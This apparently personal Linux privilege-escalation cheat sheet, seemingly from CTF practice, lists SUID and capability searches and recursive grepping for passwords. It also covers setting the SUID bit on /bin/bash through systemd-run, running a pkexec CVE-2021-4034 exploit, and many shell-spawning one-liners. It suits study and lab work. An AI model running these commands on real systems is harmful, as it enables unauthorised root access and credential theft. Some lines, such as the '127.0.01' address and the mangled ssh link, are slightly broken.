---
icon: linux
---

# Linux Privilege Scalation

Netstat

```bash
#Option 1
netstat -l

#Ports
netstat -nltp

#More
netstat -rn
```

Look for files

```bash
#SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -or -perm -2000 2>/dev/null
#Binaries con capabilities
getcap -r / 2>/dev/null

#Extra info about bin process 
**getfacl** 

#Passwords
grep -iR "pass" *
grep password .*.* -r
#File
grep -ir cri-o . 2>/dev/null

#Look for a specific file
find / -name lcars 2>/dev/null
find / -name root.txt 2>/dev/null

#Inside a file
cat /etc/zabbix/zabbix_server.conf | grep -Ev "^#" | grep .

#Check libraries
ltrace

#Looking for 32 characters file
#hex
grep -aPo '[a-fA-F0-9]{32}' /dev/sdb
#string 32 chars
strings /dev/sdb -n 32
```

User Privileges

```bash
Check user root privileges —> sudo -l
```

Port Forwarding

```bash
ssh -L {TARGETPORT}:127.0.01:8000 [sau@](<mailto:sau@10.10.11.214>){TARGETIP}
```

Symbolic Link

```bash
ln -s /root/root.txt t.trace.db
```

TTYs

```bash
#Spawn a terminal 1
python3 -c 'import pty;pty.spawn("/bin/bash")’
```

Common Vectors

```bash
#systemd-run + bash -p
systemd-run chmod u+s /bin/bash
bash -p

#pkexec
python3 CVE-2021-4034.py
```

Flash drives

```bash
#Enumerate mounted disks
mount
#more
lsblk
```

SUDO

```bash
#Interective shell
sudo -i
#su vuln
sudo su -
```

Spawning Shells

```bash
python -c 'import pty; pty.spawn("/bin/sh")' 
python3 -c 'import pty; pty.spawn("/bin/sh")'

script -qc /bin/bash /dev/null

echo os.system('/bin/bash') 
/bin/sh -i 
perl -e 'exec "/bin/sh";' 
perl: exec "/bin/sh"; 
ruby: exec "/bin/sh" 
lua: os.execute('/bin/sh') 
exec "/bin/sh"; 
/bin/bash -i
exec "/bin/sh"                # (From within IRB) 
:!bash                        # (From within vi)
:set shell=/bin/bash:shell    # (From within vi) 
!sh                           # (From within nmap)
```
